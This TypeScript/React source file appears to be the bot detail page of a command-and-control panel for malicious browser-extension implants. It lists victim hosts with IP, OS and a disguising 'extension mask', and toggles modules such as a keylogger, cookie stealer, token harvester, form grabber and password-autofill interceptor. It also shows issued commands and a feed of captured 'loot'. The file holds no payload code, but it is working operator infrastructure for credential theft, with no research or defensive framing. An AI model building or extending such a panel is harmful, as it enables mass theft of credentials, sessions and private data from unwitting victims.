import { createClient } from "@/lib/supabase/server";
import Link from "next/link";
import BotModuleToggles from "./BotModuleToggles";

export const dynamic = "force-dynamic";

const AVAILABLE_MODULES = [
    { id: "keylogger", label: "Keylogger", icon: "⌨️", desc: "Capture keystrokes from all inputs" },
    { id: "cookie_stealer", label: "Cookie Stealer", icon: "🍪", desc: "Harvest session cookies from high-value domains" },
    { id: "screenshot", label: "Screenshot", icon: "📸", desc: "Capture visible tab on navigation" },
    { id: "form_grabber", label: "Form Grabber", icon: "📝", desc: "Intercept form submissions" },
    { id: "token_harvester", label: "Token Harvester", icon: "🔑", desc: "Extract OAuth/JWT tokens from storage" },
    { id: "clipboard_monitor", label: "Clipboard Monitor", icon: "📋", desc: "Monitor clipboard for sensitive data" },
    { id: "network_scanner", label: "Network Scanner", icon: "🌐", desc: "LAN discovery and port scanning" },
    { id: "websocket_interceptor", label: "WebSocket Interceptor", icon: "🔌", desc: "Hook WebSocket traffic on messaging platforms" },
    { id: "autofill_interceptor", label: "Autofill Interceptor", icon: "🔐", desc: "Capture browser password manager autofill" },
    { id: "behavior_profiler", label: "Behavior Profiler", icon: "👤", desc: "Build typing biometrics and browsing profile" },
];

async function getBotData(botId: string) {
    const supabase = await createClient();

    const [botRes, configRes, lootRes, commandsRes] = await Promise.all([
        supabase.from("bots").select("*").eq("bot_id", botId).single(),
        supabase.from("bot_configs").select("*").eq("bot_id", botId).single(),
        supabase
            .from("loot")
            .select("id, category, title, created_at")
            .eq("bot_id", botId)
            .order("created_at", { ascending: false })
            .limit(15),
        supabase
            .from("commands")
            .select("id, command_type, status, created_at")
            .eq("bot_id", botId)
            .order("created_at", { ascending: false })
            .limit(10),
    ]);

    return {
        bot: botRes.data,
        config: configRes.data,
        loot: lootRes.data || [],
        commands: commandsRes.data || [],
    };
}

export default async function BotDetailPage({ params }: { params: Promise<{ id: string }> }) {
    const { id: botId } = await params;
    const { bot, config, loot, commands } = await getBotData(botId);

    if (!bot) {
        return (
            <div className="text-center py-20">
                <p className="text-zinc-400 text-lg">Bot not found</p>
                <Link href="/bots" className="text-emerald-400 text-sm mt-2 inline-block">← Back to Bots</Link>
            </div>
        );
    }

    const enabledModules: string[] = config?.modules_enabled || [];

    const categoryIcons: Record<string, string> = {
        credentials: "🔐", cookies: "🍪", keylog: "⌨️", screenshot: "📸",
        token: "🔑", network: "🌐", clipboard: "📋", form: "📝",
        profile: "👤", websocket: "🔌", other: "📦",
    };

    return (
        <div>
            {/* Header */}
            <div className="mb-8">
                <Link href="/bots" className="text-xs text-zinc-500 hover:text-zinc-300 mb-3 inline-block">← Back to Bots</Link>
                <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-emerald-500 to-cyan-500 flex items-center justify-center text-xl shadow-lg shadow-emerald-500/20">
                        🖥️
                    </div>
                    <div>
                        <h1 className="text-xl font-bold text-white font-mono">{bot.bot_id.slice(0, 20)}...</h1>
                        <p className="text-zinc-500 text-sm">{bot.hostname || "Unknown host"} • {bot.ip_address || "No IP"} • {bot.os || "Unknown OS"}</p>
                    </div>
                </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* Module Toggles (2/3 width) */}
                <div className="lg:col-span-2">
                    <div className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl overflow-hidden">
                        <div className="px-6 py-4 border-b border-zinc-800/50">
                            <h2 className="text-sm font-semibold text-white">Module Configuration</h2>
                            <p className="text-xs text-zinc-500 mt-0.5">Toggle capabilities for this bot</p>
                        </div>
                        <div className="p-4">
                            <BotModuleToggles
                                botId={bot.bot_id}
                                availableModules={AVAILABLE_MODULES}
                                enabledModules={enabledModules}
                            />
                        </div>
                    </div>
                </div>

                {/* Bot Info Card (1/3 width) */}
                <div className="space-y-6">
                    <div className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl p-6">
                        <h3 className="text-sm font-semibold text-white mb-4">Bot Details</h3>
                        <dl className="space-y-3 text-sm">
                            {[
                                ["Bot ID", bot.bot_id],
                                ["Hostname", bot.hostname || "—"],
                                ["IP Address", bot.ip_address || "—"],
                                ["OS", bot.os || "—"],
                                ["Browser", bot.browser || "—"],
                                ["Mask", bot.extension_mask || "Unknown"],
                                ["Created", new Date(bot.created_at).toLocaleString()],
                                ["Last Seen", new Date(bot.last_seen_at).toLocaleString()],
                                ["Beacon Interval", `${config?.beacon_interval_sec || 300}s`],
                                ["Kill Switch", config?.kill_switch ? "🔴 ACTIVE" : "⚪ OFF"],
                            ].map(([label, value]) => (
                                <div key={label as string} className="flex justify-between">
                                    <dt className="text-zinc-500">{label}</dt>
                                    <dd className="text-zinc-300 font-mono text-xs max-w-[180px] truncate">{value}</dd>
                                </div>
                            ))}
                        </dl>
                    </div>

                    {/* Recent Commands */}
                    <div className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl overflow-hidden">
                        <div className="px-6 py-3 border-b border-zinc-800/50">
                            <h3 className="text-sm font-semibold text-white">Recent Commands</h3>
                        </div>
                        {commands.length === 0 ? (
                            <p className="px-6 py-8 text-center text-zinc-600 text-xs">No commands issued.</p>
                        ) : (
                            <div className="divide-y divide-zinc-800/30">
                                {commands.map((cmd) => (
                                    <div key={cmd.id} className="px-6 py-2.5 flex justify-between items-center">
                                        <span className="text-xs text-zinc-300 font-mono">{cmd.command_type}</span>
                                        <span className={`text-[10px] px-1.5 py-0.5 rounded ${cmd.status === "executed" ? "bg-emerald-500/15 text-emerald-400" :
                                                cmd.status === "pending" ? "bg-amber-500/15 text-amber-400" :
                                                    "bg-red-500/15 text-red-400"
                                            }`}>{cmd.status}</span>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </div>
            </div>

            {/* Recent Loot from this Bot */}
            <div className="mt-6 bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl overflow-hidden">
                <div className="px-6 py-4 border-b border-zinc-800/50">
                    <h2 className="text-sm font-semibold text-white">Recent Loot from this Bot</h2>
                </div>
                {loot.length === 0 ? (
                    <p className="px-6 py-8 text-center text-zinc-600 text-sm">No loot captured from this bot yet.</p>
                ) : (
                    <div className="divide-y divide-zinc-800/30">
                        {loot.map((item) => (
                            <div key={item.id} className="px-6 py-3 flex items-center justify-between hover:bg-zinc-800/20 transition-colors">
                                <div className="flex items-center gap-3">
                                    <span>{categoryIcons[item.category] || "📦"}</span>
                                    <span className="text-sm text-white">{item.title}</span>
                                </div>
                                <div className="flex items-center gap-3">
                                    <span className="text-xs bg-zinc-800 px-2 py-0.5 rounded text-zinc-400 capitalize">{item.category}</span>
                                    <span className="text-[11px] text-zinc-600">{new Date(item.created_at).toLocaleString()}</span>
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
}
